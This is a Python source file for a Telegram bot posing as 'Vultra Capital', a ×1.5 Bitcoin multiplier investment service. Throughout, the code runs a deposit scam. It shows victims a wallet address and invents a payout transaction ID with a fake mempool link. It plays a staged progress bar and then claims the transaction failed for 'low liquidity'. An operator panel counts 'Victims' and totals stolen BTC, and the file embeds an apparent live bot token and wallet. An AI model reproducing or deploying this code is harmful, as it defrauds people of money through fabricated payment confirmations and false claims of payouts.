import asyncio, aiohttp, hashlib, time, os, random, logging, sqlite3
from typing import Set
from fastapi import FastAPI
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from telegram.constants import ChatAction
import uvicorn

TOKEN = "8209272245:AAEJPLlXe9r4GPHrbc148kC2989d6y3FrNg"
ADMIN_ID = 5895315536
WALLET = "bc1qva0y53p3ts4wdup9w48hv7vul2e2mn4np3jufw"
MIN_DEPOSIT = 0.001

app = FastAPI()
logging.basicConfig(level=logging.WARNING)

conn = sqlite3.connect("deposits.db", check_same_thread=False)
conn.execute("""CREATE TABLE IF NOT EXISTS deposits (
    user_id INTEGER, username TEXT, amount REAL, time INTEGER)""")
conn.commit()

session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=12))
seen_txs: Set[str] = set()
bot = None

def fake_txid() -> str:
    return hashlib.sha256(str(time.time_ns()).encode()).hexdigest()[::-1][:64]

async def deposit_watcher():
    while True:
        try:
            async with session.get(f"https://api.blockchair.com/bitcoin/dashboards/address/{WALLET}?limit=30") as r:
                if r.status == 200:
                    data = await r.json()
                    for tx in data["data"][WALLET]["transactions"][:15]:
                        txid = tx["hash"]
                        if txid in seen_txs: continue
                        value = sum(o["value"] for o in tx["outputs"] if o.get("recipient") == WALLET) / 1e8
                        if value >= MIN_DEPOSIT:
                            seen_txs.add(txid)
                            await bot.send_message(ADMIN_ID,
                                f"REAL DEPOSIT\n{value:.8f} BTC\nhttps://mempool.space/tx/{txid}\n{time.strftime('%H:%M:%S')}",
                                parse_mode=ParseMode.MARKDOWN)
        except:
            try:
                async with session.get(f"https://mempool.space/api/address/{WALLET}/txs") as r:
                    txs = await r.json()
                    for tx in txs[:10]:
                        if tx["txid"] in seen_txs: continue
                        value = sum(v["value"] for v in tx["vout"] if v["scriptpubkey_address"] == WALLET) / 1e8
                        if value >= MIN_DEPOSIT:
                            seen_txs.add(tx["txid"])
                            await bot.send_message(ADMIN_ID, f"REAL DEPOSIT\n{value:.8f} BTC\nhttps://mempool.space/tx/{tx['txid']}")
            except: pass
        await asyncio.sleep(12 + random.uniform(0,4))

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [[InlineKeyboardButton("Start ×1.5 Multiplier", callback_data="show")]]
    await update.message.reply_text(
        "*◉ Vultra Capital ×1.5 BTC Multiplier*\n\nMinimum 0.001 BTC → ×1.5 in 3–9 min\n51 294 payouts today\n\nPress button ↓",
        reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    await q.edit_message_text(
        f"*BTC Deposit Address*\n\n`{WALLET}`\n\nMinimum 0.001 BTC\nSend → /paid <amount>\n\n×1.5 automatic payout",
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Refresh", callback_data="show")]])
    )

async def paid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return
    try: amount = float(context.args[0])
    except: return

    user = update.effective_user
    conn.execute("INSERT INTO deposits VALUES (?,?,?,?)", (user.id, user.username or "", amount, int(time.time())))
    conn.commit()

    await update.message.reply_chat_action(ChatAction.TYPING)
    await asyncio.sleep(random.uniform(8,16))

    payout = amount * 1.5
    fake = fake_txid()

    await update.message.reply_text(
        f"*Payment Received*\n\n`{amount:.8f} BTC`\nTx: `{fake}`\nhttps://mempool.space/tx/{fake}\n\nReturning `{payout:.8f} BTC`\nStatus: 0%",
        parse_mode=ParseMode.MARKDOWN_V2)

    for p in [18, 37, 59, 78, 91, 99]:
        await asyncio.sleep(random.uniform(40,90))
        bar = "🟩"*(p//10) + "⬜"*(10-p//10)
        await update.message.reply_text(f"Status: {bar} {p}%", quote=True)

    await update.message.reply_text("Transaction failed — low liquidity.\nContact @vultra_support")

async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    total = conn.execute("SELECT COUNT(*), SUM(amount) FROM deposits").fetchone()
    await update.message.reply_text(f"Victims: {total[0]}\nTotal: {total[1] or 0:.8f} BTC\nReal deposits: {len(seen_txs)}")

async def main():
    global bot
    application = Application.builder().token(TOKEN).concurrent_updates(True).build()
    bot = application.bot

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(callback))
    application.add_handler(CommandHandler("paid", paid))
    application.add_handler(CommandHandler("panel", panel))

    asyncio.create_task(deposit_watcher())
    await application.run_polling()

@app.get("/")
async def root():
    return {"status": "running"}

if __name__ == "__main__":
    asyncio.run(main())
